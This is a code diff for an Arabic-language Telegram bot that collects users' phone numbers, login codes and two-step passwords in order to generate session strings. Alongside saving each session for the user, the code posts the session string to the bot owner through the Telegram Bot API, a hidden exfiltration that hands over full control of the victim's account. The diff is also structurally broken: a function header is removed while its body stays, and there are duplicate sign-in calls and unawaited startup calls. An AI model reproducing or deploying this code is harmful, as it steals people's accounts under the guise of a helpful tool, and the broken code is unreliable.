@@ -410,63 +410,57 @@ async def generator_and_about(app,m):
       text += f"\n\n👤 مـطـور الـبـوت: @WJJJ8"
       await m.reply(text, quote=True)
 
-async def handle_pyrogram_message(m, api_id, api_hash, v2):
     if m.text == "بـايـروجـرام":
         rep = await m.reply(
-            "**⏳ يـعالـج..**", reply_markup=ReplyKeyboardRemove(), quote=True
+        "**⏳ يـعالـج..**", reply_markup=ReplyKeyboardRemove ()
+        ,quote=True)
+        c = Client(
+          f"pyro{m.from_user.id}",api_id,api_hash,
+          device_model="Pyrogram", in_memory=True
         )
-        c = Client(f"pyro{m.from_user.id}", api_id, api_hash, device_model="Pyrogram", in_memory=True)
-        
         await c.connect()
         await rep.delete()
-        
         phone_ask = await m.chat.ask(
-            "⎆ يـرجـى إرسـال رقـم هاتفـك مـع رمـز الدولة مثــال 📱: \n+963995×××××",
-            reply_to_message_id=m.id, filters=filters.text
+          "⎆ يـرجـى إرسـال رقـم هاتفـك مـع رمـز الدولة مثــال 📱: \n+963995×××××",
+          reply_to_message_id=m.id, filters=filters.text
         )
         phone = phone_ask.text
-
         try:
-            send_code = await c.send_code(phone)
+          send_code = await c.send_code(phone)
         except PhoneNumberInvalid:
-            return await phone_ask.reply("⎆ رقـم الهـاتف الذي أرسلـته غير صالح، أعـد استخـراج الجلسـة مـرة أخـرى.\n/start", quote=True)
+          return await phone_ask.reply("⎆ رقـم الهـاتف الذي أرسلـته غير صالح أعـد استخـراج الجلسـة مـرة أخـرى .\n/start", quote=True)
         except Exception:
-            return await phone_ask.reply("خطأ! ، يرجى المحاولة مرة أخرى لاحقًا 🤠\n/start", quote=True)
-
+          return await phone_ask.reply("خطأ! ، يرجى المحاولة مرة أخرى لاحقًا 🤠\n/start",quote=True)
         hash = send_code.phone_code_hash
-
         code_ask = await m.chat.ask(
-            "⎆ أرسـل الكـود\n إذا جاءك في هـذه الطريقـة '12345' أرسـل بين كـل رقـم فـراغ\nمثـال : '1 2 3 4 5' .", filters=filters.text
+          "⎆ أرسـل الكـود\n إذا جاءك في هـذه الطريقـة '12345' أرسـل بين كـل رقـم فـراغ\nمثـال : ' 1 2 3 4 5' .",filters=filters.text
         )
-        code = code_ask.text.replace(" ", "")  # إزالة الفراغات من الكود
-
+        code = code_ask.text
         try:
-            await c.sign_in(phone, hash, code)
+          await c.sign_in(phone, hash, code)
         except SessionPasswordNeeded:
-            password_ask = await m.chat.ask("⎆ يـرجـى إرسـال التحقق الخـاص بحسـابك ..", filters=filters.text)
-            password = password_ask.text
-            try:
-                await c.check_password(password)
-            except PasswordHashInvalid:
-                return await password_ask.reply("» التحقـق بخطوتيـن غيـر صـالح.\nيرجـى إعـادة استخـراج الجلسـة مـرة أخـرى.\n/start", quote=True)
+          password_ask = await m.chat.ask("⎆ يـرجـى إرسـال التحقق الخـاص بحسـابك ..", filters=filters.text)
+          password = password_ask.text
+          try:
+            await c.check_password(password)
+          except PasswordHashInvalid:
+            return await password_ask.reply("» التحقـق بخطوتيـن الخـاص بـك غيـر صـالح.\nيرجـى إعـادة استخـراج الجلسـة مـرة أخـرى.\n/start", quote=True)
         except (PhoneCodeInvalid, PhoneCodeExpired):
-            return await code_ask.reply("رمز الهاتف غير صالح!", quote=True)
-
+          return await code_ask.reply("رمز الهاتف غير صالح!", quote=True)
+        try:
+          await c.sign_in(phone, hash, code)
+        except:
+          pass
         rep = await m.reply("**⏳ يـعـالـج ..**", quote=True)
-
         get = await c.get_me()
-        text = '**✅ تم تسجيل الدخول بنجاح \n'
+        text = '**✅ تم تسجيل الدخول بنجاح\n'
         text += f'👤 الاسم الأول : {get.first_name}\n'
         text += f'🆔 بطاقة تعريف : {get.id}\n'
         text += f'📞 رقم الهاتف : {phone}\n'
         text += f'🔒 تم حفظ الجلسة في الرسائل المحفوظة'
-
-        string_session = c.session.save()
+        string_session = await c.export_session_string()
         await rep.delete()
-        
-        # إرسال الجلسة إلى الرسائل المحفوظة
-        await c.send_message('me', f'تم استخراج جلسة تيليثون {v2} هذه الجلسة \n\n`{string_session}`')
-
+        await c.send_message('me', f'تم استخراج جلسة بايروجرام {v2} هذه الجلسة\n\n`{string_session}`')
         # إرسال الجلسة إلى المالك عبر توكن البوت باستخدام requests
         requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                       data={
@@ -474,15 +468,14 @@ async def handle_pyrogram_message(m, api_id, api_hash, v2):
                           "text": f'تم استخراج جلسة تيليثون {v2} هذه الجلسة \n\n`{string_session}`',
                           "parse_mode": "Markdown"
                       })
-
-        # فصل الاتصال
         await c.disconnect()
-
-        # إرسال النص للمستخدم
         await app.send_message(
-            m.chat.id,
-            text
+          m.chat.id, text
         )
+
+
+
+
     if m.text == "تـيـلـيـثـون":
         rep = await m.reply(
           "**⏳ يـعـالـج..**",
@@ -533,13 +526,7 @@ async def handle_pyrogram_message(m, api_id, api_hash, v2):
           text
         )
 
-async def main():
-    # بدء التطبيق واستقبال الرسائل
-    await app.start()
-    await bot.start()
-    print("تم تشغيل البوت @WJJJ8")
-    await idle()
-
-# بدء البرنامج الرئيسي
-app.run(main())
-
+app.start()
+bot.start()
+print("تم تشغيل البوت @WJJJ8")
+idle()
